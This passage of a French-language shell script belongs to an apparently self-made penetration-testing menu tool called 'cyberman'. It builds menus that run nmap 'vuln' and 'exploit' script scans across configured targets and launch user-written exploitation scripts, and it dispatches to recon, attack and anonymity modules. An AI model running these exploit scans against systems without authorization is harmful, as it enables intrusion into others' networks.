            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # DESC: Affiche le menu Custom Nmap Scripts
    # USAGE: show_custom_nmap_menu
    show_custom_nmap_menu() {
        show_header
        printf "${YELLOW}📜 CUSTOM NMAP SCRIPTS${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        echo "1.  Lister les scripts nmap disponibles"
        echo "2.  Exécuter un script nmap personnalisé"
        echo "3.  Créer un script nmap personnalisé"
        echo "4.  Scan avec scripts vuln"
        echo "5.  Scan avec scripts exploit"
        echo "0.  Retour"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Nmap Scripts" <<'EOF'
Lister les scripts nmap disponibles|1
Executer un script nmap personnalise|2
Creer un script nmap personnalise|3
Scan avec scripts vuln|4
Scan avec scripts exploit|5
Retour|0
EOF
)
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        case "$choice" in
            1)
                if command -v nmap >/dev/null 2>&1; then
                    scripts_dir="/usr/share/nmap/scripts"
                    if [ -d "$scripts_dir" ]; then
                        echo "📜 Scripts nmap disponibles:"
                        ls -1 "$scripts_dir"/*.nse 2>/dev/null | wc -l | xargs echo "   Total:"
                        echo ""
                        printf "Afficher la liste complète? (o/N): "
        read show_all
                        if [ "$show_all" = "o" ] || [ "$show_all" = "O" ]; then
                            ls -1 "$scripts_dir"/*.nse 2>/dev/null | head -50
                        fi
                    else
                        echo "⚠️  Répertoire des scripts nmap non trouvé"
                    fi
                else
                    echo "❌ nmap non installé"
                fi
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            2)
                if [ -n "$CYBER_TARGETS" ] && [ "$(echo "$CYBER_TARGETS" | wc -w)" -gt 0 ]; then
                    printf "📜 Nom du script (sans .nse): "
        read script_name
                    if [ -n "$script_name" ]; then
                        for target in $CYBER_TARGETS; do
                            echo "🎯 Scan avec script $script_name sur $target"
                            nmap --script "$script_name" "$target"
                        done
                    fi
                else
                    echo "❌ Aucune cible configurée"
                fi
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            3)
                echo "💡 Créez vos scripts dans ~/.nmap/scripts/"
                echo "💡 Documentation: https://nmap.org/book/nse.html"
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            4)
                if [ -n "$CYBER_TARGETS" ] && [ "$(echo "$CYBER_TARGETS" | wc -w)" -gt 0 ]; then
                    for target in $CYBER_TARGETS; do
                        echo "🎯 Scan vuln sur $target"
                        nmap --script vuln "$target"
                    done
                else
                    echo "❌ Aucune cible configurée"
                fi
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            5)
                if [ -n "$CYBER_TARGETS" ] && [ "$(echo "$CYBER_TARGETS" | wc -w)" -gt 0 ]; then
                    for target in $CYBER_TARGETS; do
                        echo "🎯 Scan exploit sur $target"
                        nmap --script exploit "$target"
                    done
                else
                    echo "❌ Aucune cible configurée"
                fi
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # DESC: Affiche le menu Custom Exploitation Scripts
    # USAGE: show_custom_exploit_menu
    show_custom_exploit_menu() {
        show_header
        printf "${YELLOW}🔨 CUSTOM EXPLOITATION SCRIPTS${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        echo "1.  Lister les scripts personnalisés"
        echo "2.  Exécuter un script personnalisé"
        echo "3.  Créer un nouveau script"
        echo "0.  Retour"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Custom Exploit Scripts" <<'EOF'
Lister les scripts personnalises|1
Executer un script personnalise|2
Creer un nouveau script|3
Retour|0
EOF
)
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        case "$choice" in
            1)
                scripts_dir="$HOME/.cyberman/scripts"
                if [ -d "$scripts_dir" ]; then
                    echo "📜 Scripts personnalisés:"
                    ls -1 "$scripts_dir"/*.sh 2>/dev/null || echo "   Aucun script trouvé"
                else
                    echo "⚠️  Répertoire des scripts non trouvé: $scripts_dir"
                    echo "💡 Créez-le: mkdir -p $scripts_dir"
                fi
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            2)
                scripts_dir="$HOME/.cyberman/scripts"
                if [ -d "$scripts_dir" ]; then
                    echo "📜 Scripts disponibles:"
                    ls -1 "$scripts_dir"/*.sh 2>/dev/null | nl
                    echo ""
                    printf "📝 Nom du script: "
        read script_name
                    if [ -n "$script_name" ] && [ -f "$scripts_dir/$script_name" ]; then
                        bash "$scripts_dir/$script_name"
                    else
                        echo "❌ Script non trouvé"
                    fi
                else
                    echo "❌ Répertoire des scripts non trouvé"
                fi
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            3)
                echo "💡 Créez vos scripts dans ~/.cyberman/scripts/"
                echo "💡 Les scripts peuvent utiliser les variables CYBER_TARGETS"
                printf "Appuyez sur une touche pour continuer..."; read dummy
                ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # =========================================================================
    # CATÉGORIE: NETWORK DEVICES & INFRASTRUCTURE
    # =========================================================================
    # DESC: Affiche le menu pour les appareils réseau et infrastructure
    # USAGE: show_network_devices_menu
    # EXAMPLE: show_network_devices_menu
    show_network_devices_menu() {
        show_header
        printf "${YELLOW}🔌 NETWORK DEVICES & INFRASTRUCTURE${RESET}\n"
        printf "${BLUE}══════════════════════════════════════════════════════════════════${RESET}\n"
        echo "1.  Router scan               - Scan routeurs"
        echo "2.  Switch scan               - Scan switches"
        echo "3.  Firewall scan             - Scan pare-feu"
        echo "4.  SNMP scan                 - Scan SNMP"
        echo "5.  Check Telnet              - Vérifier si telnet est actif"
        echo "6.  SSH scan                  - Scan SSH"
        echo "7.  FTP scan                  - Scan FTP"
        echo "8.  SMB scan                  - Scan SMB/CIFS"
        echo "9.  Network topology          - Topologie réseau"
        echo "10. VLAN scan                 - Scan VLAN"
        echo "11. OSPF scan                 - Scan OSPF"
        echo "12. BGP scan                  - Scan BGP"
        echo "0.  Retour au menu principal"
        echo ""
        choice=$(cyber_pick_menu "CYBERMAN - Network Devices" <<'EOF'
Router scan|1
Switch scan|2
Firewall scan|3
SNMP scan|4
Check Telnet|5
SSH scan|6
FTP scan|7
SMB scan|8
Network topology|9
VLAN scan|10
OSPF scan|11
BGP scan|12
Retour|0
EOF
)
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        case "$choice" in
            1) echo "⚠️  Fonction Router scan à implémenter" ; sleep 2 ;;
            2) echo "⚠️  Fonction Switch scan à implémenter" ; sleep 2 ;;
            3) echo "⚠️  Fonction Firewall scan à implémenter" ; sleep 2 ;;
            4) echo "⚠️  Fonction SNMP scan à implémenter" ; sleep 2 ;;
            5) . "$CYBER_DIR/scanning/check_telnet.sh" && check_telnet ;;
            6) echo "⚠️  Fonction SSH scan à implémenter" ; sleep 2 ;;
            7) echo "⚠️  Fonction FTP scan à implémenter" ; sleep 2 ;;
            8) . "$CYBER_DIR/scanning/enum_shares.sh" && enum_shares ;;
            9) . "$CYBER_DIR/reconnaissance/network_map.sh" && network_map ;;
            10) echo "⚠️  Fonction VLAN scan à implémenter" ; sleep 2 ;;
            11) echo "⚠️  Fonction OSPF scan à implémenter" ; sleep 2 ;;
            12) echo "⚠️  Fonction BGP scan à implémenter" ; sleep 2 ;;
            0) return ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    }
    
    # Gestion des arguments rapides
    if [ -n "$1" ]; then
        _logdf="${DOTFILES_DIR:-$HOME/dotfiles}"
        [ -f "$_logdf/scripts/lib/managers_log_posix.sh" ] && . "$_logdf/scripts/lib/managers_log_posix.sh" && managers_cli_log cyberman "$@"
    fi
    if [ "$1" = "recon" ]; then show_recon_menu; return; fi
    if [ "$1" = "scan" ]; then show_scan_menu; return; fi
    if [ "$1" = "vuln" ]; then show_vuln_menu; return; fi
    if [ "$1" = "attack" ]; then show_attack_menu; return; fi
    if [ "$1" = "analysis" ]; then show_analysis_menu; return; fi
    if [ "$1" = "privacy" ]; then show_privacy_menu; return; fi
    if [ "$1" = "env" ]; then show_environment_menu; return; fi
    if [ "$1" = "workflow" ]; then show_workflow_menu; return; fi
    if [ "$1" = "report" ]; then show_report_menu; return; fi
    if [ "$1" = "anon" ]; then show_anonymity_menu; return; fi
    if [ "$1" = "assistant" ]; then show_assistant_menu; return; fi
    if [ "$1" = "web" ]; then show_web_menu; return; fi
    if [ "$1" = "iot" ]; then show_iot_menu; return; fi
    if [ "$1" = "network" ]; then show_network_devices_menu; return; fi
    if [ "$1" = "learn" ] || [ "$1" = "learning" ]; then show_learning_menu; return; fi
    if [ "$1" = "help" ]; then show_help; return; fi
    if [ "$1" = "load_infos" ] && [ -n "$2" ]; then
        if [ -f "$CYBER_DIR/environment_manager.sh" ]; then
            . "$CYBER_DIR/environment_manager.sh" 2>/dev/null
            load_infos "$2"
        fi
        return
    fi
    
    # Menu interactif principal
    while true; do
        show_main_menu
        choice=""
        if [ -t 0 ] && [ -t 1 ] && command -v dotfiles_ncmenu_select >/dev/null 2>&1; then
            menu_input_file=$(mktemp)
            cat > "$menu_input_file" <<'EOF'
Gestion & Configuration|1
Reconnaissance & Information Gathering|2
Scanning & Enumeration|3
Vulnerability Assessment & Session|4
Web Security & Testing|5
Network Tools|6
IoT Devices & Embedded Systems|7
Advanced Tools|8
Utilitaires|9
Apprentissage & Labs|10
OSINT Tools|11
Assistant de test complet|12
Notes & infos environnement actif|13
Rapports environnement actif|14
Workflows environnement actif|15
Desactiver environnement actif|16
Aide|h
Quitter|q
EOF
            choice=$(dotfiles_ncmenu_select "CYBERMAN - Menu principal" < "$menu_input_file" 2>/dev/null || true)
            rm -f "$menu_input_file"
        fi
        if [ -z "$choice" ]; then
            printf "Choix: "
            read choice
        fi
        # Nettoyer le choix pour éviter les problèmes avec "10", "11", etc.
        choice=$(echo "$choice" | tr -d '[:space:]' | head -c 2)
        case "$choice" in
            1)
                # Menu de gestion et configuration
                # S'assurer que CYBER_DIR est défini correctement
                CYBER_DIR="${CYBER_DIR:-$HOME/dotfiles/zsh/functions/cyberman/modules/legacy}"
                export CYBER_DIR
                
                # Charger d'abord les dépendances nécessaires
                if [ -f "$CYBER_DIR/target_manager.sh" ]; then
                    . "$CYBER_DIR/target_manager.sh" 2>/dev/null
                fi
                if [ -f "$CYBER_DIR/environment_manager.sh" ]; then
                    . "$CYBER_DIR/environment_manager.sh" 2>/dev/null
                fi
                if [ -f "$CYBER_DIR/workflow_manager.sh" ]; then
                    . "$CYBER_DIR/workflow_manager.sh" 2>/dev/null
                fi
                if [ -f "$CYBER_DIR/report_manager.sh" ]; then
                    . "$CYBER_DIR/report_manager.sh" 2>/dev/null
                fi
                if [ -f "$CYBER_DIR/anonymity_manager.sh" ]; then
                    . "$CYBER_DIR/anonymity_manager.sh" 2>/dev/null
                fi
                
                # Charger le menu de gestion
                if [ -f "$CYBER_DIR/management_menu.sh" ]; then
                    . "$CYBER_DIR/management_menu.sh" 2>/dev/null
                    if type show_management_menu >/dev/null 2>&1; then
                        show_management_menu
                    else
                        echo "❌ Fonction show_management_menu non trouvée après chargement"
                        echo "💡 Fichier chargé: $CYBER_DIR/management_menu.sh"
                        echo "💡 Vérifiez les erreurs de syntaxe dans le fichier"
                        sleep 3
                    fi
                else
                    echo "❌ Menu de gestion non disponible"
                    echo "💡 Fichier attendu: $CYBER_DIR/management_menu.sh"
                    echo "💡 Vérifiez que le fichier existe"
                    ls -la "$CYBER_DIR/management_menu.sh" 2>/dev/null || echo "   Fichier non trouvé"
                    sleep 3
                fi
                ;;
            2) show_recon_menu ;;
            3) show_scan_menu ;;
            4) show_vuln_menu ;;
            5) show_web_menu ;;
            6) show_network_tools_menu ;;
            7) show_iot_menu ;;
            8) show_advanced_tools_menu ;;
            9) show_utilities_menu ;;
            10) show_learning_menu ;;
            11) 
                if [ -f "$HOME/dotfiles/zsh/functions/cyberman/modules/osint/osint_manager.sh" ]; then
                    . "$HOME/dotfiles/zsh/functions/cyberman/modules/osint/osint_manager.sh"
                    show_osint_menu
                else
                    printf "${RED}❌ Module OSINT non disponible${RESET}\n"
                    sleep 2
                fi
                ;;
            12) show_assistant_menu ;;
            13)
                # Accès rapide aux notes de l'environnement actif
                if [ -f "$CYBER_DIR/environment_manager.sh" ] && command -v has_active_environment >/dev/null 2>&1 && has_active_environment 2>/dev/null; then
                    current_env=$(command -v get_current_environment >/dev/null 2>&1 && get_current_environment 2>/dev/null || echo "")
                    if [ -f "$CYBER_DIR/management_menu.sh" ]; then
                        . "$CYBER_DIR/management_menu.sh"
                        show_environment_info_menu
                    elif [ -f "$CYBER_DIR/environment_manager.sh" ]; then
                        . "$CYBER_DIR/environment_manager.sh" 2>/dev/null
                        load_infos "$current_env"
                    else
                        echo "❌ Gestionnaire d'environnements non disponible"
                        sleep 1
                    fi
                else
                    echo "❌ Aucun environnement actif"
                    echo "💡 Chargez d'abord un environnement - Option 1 > Environnements"
                    sleep 2
                fi
                ;;
            14)
                # Accès rapide aux rapports
                if [ -f "$CYBER_DIR/environment_manager.sh" ] && command -v has_active_environment >/dev/null 2>&1 && has_active_environment 2>/dev/null; then
                    if [ -f "$CYBER_DIR/report_manager.sh" ]; then
                        . "$CYBER_DIR/report_manager.sh" 2>/dev/null
                        show_report_menu
                    else
                        echo "❌ Gestionnaire de rapports non disponible"
                        sleep 2
                    fi
                else
                    echo "❌ Aucun environnement actif"
                    echo "💡 Chargez d'abord un environnement - Option 1 > Environnements"
                    sleep 2
                fi
                ;;
            15)
                # Accès rapide aux workflows
                if [ -f "$CYBER_DIR/environment_manager.sh" ] && command -v has_active_environment >/dev/null 2>&1 && has_active_environment 2>/dev/null; then
                    if [ -f "$CYBER_DIR/workflow_manager.sh" ]; then
                        . "$CYBER_DIR/workflow_manager.sh" 2>/dev/null
                        show_workflow_menu
                    else
                        echo "❌ Gestionnaire de workflows non disponible"
                        sleep 2
                    fi
                else
                    echo "❌ Aucun environnement actif"
                    echo "💡 Chargez d'abord un environnement - Option 1 > Environnements"
                    sleep 2
                fi
                ;;
            16)
                # Désactiver l'environnement actif
                if [ -f "$CYBER_DIR/environment_manager.sh" ] && command -v has_active_environment >/dev/null 2>&1 && has_active_environment 2>/dev/null; then
                    current_env=$(command -v get_current_environment >/dev/null 2>&1 && get_current_environment 2>/dev/null || echo "")
                    if [ -f "$CYBER_DIR/environment_manager.sh" ]; then
                        . "$CYBER_DIR/environment_manager.sh" 2>/dev/null
                        printf "⚠️  Voulez-vous désactiver l'environnement '$current_env'? (o/N): "
        read confirm
                        if [ "$confirm" = "o" ] || [ "$confirm" = "O" ]; then
                            deactivate_environment
                            # Forcer la mise à jour immédiate - IMPORTANT: faire ça AVANT de recharger
                            CYBER_CURRENT_ENV=""
                            rm -f "${HOME}/.cyberman/current_env.txt" 2>/dev/null
                            # Ne PAS recharger le gestionnaire ici car il pourrait recharger depuis le fichier
                            # Le rechargement se fera automatiquement dans show_main_menu
                            echo ""
                            printf "Appuyez sur une touche pour continuer..."; read dummy
                        fi
                    else
                        echo "❌ Gestionnaire d'environnements non disponible"
                        sleep 1
                    fi
                else
                    echo "❌ Aucun environnement actif"
                    sleep 1
                fi
                ;;
            h|H) show_help ;;
            q|Q) break ;;
            *) printf "${RED}Choix invalide${RESET}"; sleep 1 ;;
        esac
    done
    printf "${GREEN}Au revoir !${RESET}\n"
}

# Message d'initialisation - désactivé pour éviter l'avertissement Powerlevel10k
# echo "🛡️ CYBERMAN chargé - Tapez 'cyberman' ou 'cm' pour démarrer"

# Alias (défini dans une fonction pour compatibilité POSIX)
if [ -n "$ZSH_VERSION" ] || [ -n "$BASH_VERSION" ]; then
    alias cm='cyberman' 2>/dev/null || true
fi

